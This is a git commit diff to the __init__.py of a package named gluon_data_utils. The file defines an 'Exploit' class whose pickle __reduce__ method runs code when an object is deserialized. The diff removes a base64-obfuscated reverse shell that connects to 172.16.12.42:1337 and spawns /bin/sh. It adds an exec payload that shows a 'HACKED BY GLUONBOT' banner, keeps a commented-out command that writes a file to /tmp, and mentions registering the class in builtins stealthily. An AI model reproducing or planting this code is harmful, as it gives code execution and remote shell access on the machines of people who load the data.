f556574b8944e3a1eb3484d3e2df7e4f12bae879
Farheenfatima9 <105305445+Farheenfatima9@users.noreply.github.com>
2025-05-30 12:57:28 +0500

    Update __init__.py

--- gluon_data_utils/__init__.py
+++ gluon_data_utils/__init__.py
@@ -1,17 +1,32 @@
 # gluon_data_utils/__init__.py
 import builtins
 import os
+from IPython.display import display, HTML
 
 # class Exploit:
 #     def __reduce__(self):
 #         return (os.system, ("echo 'RCE from dataset' > /tmp/pwned.txt",))
 
 
+
+
 class Exploit:
     def __reduce__(self):
-        import base64
-        b64 = b'aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zOwpzPXNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsKcy5jb25uZWN0KCgiMTcyLjE2LjEyLjQyICIsMTMzNykpOwpvcy5kdXAyKHMuZmlsZW5vKCksMCk7Cm9zLmR1cDIocy5maWxlbm8oKSwxKTsKb3MuZHVwMihzLmZpbGVubygpLDIpOwpzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK'
-        return (os.system, ("python3 -c \"$(echo {} | base64 -d)\"".format(b64.decode()),))
+        code = """
+        from IPython.display import display, HTML
+        display(HTML(\"""
+        <div style='
+            background: red;
+            color: white;
+            font-size: 20px;
+            text-align: center;
+            padding: 10px;
+            border: 3px solid black;
+        '>⚠️ HACKED BY GLUONBOT ⚠️</div>
+        \"""))
+        """
+        return (exec, (code,))
+
 
 
 # Register in builtins stealthily
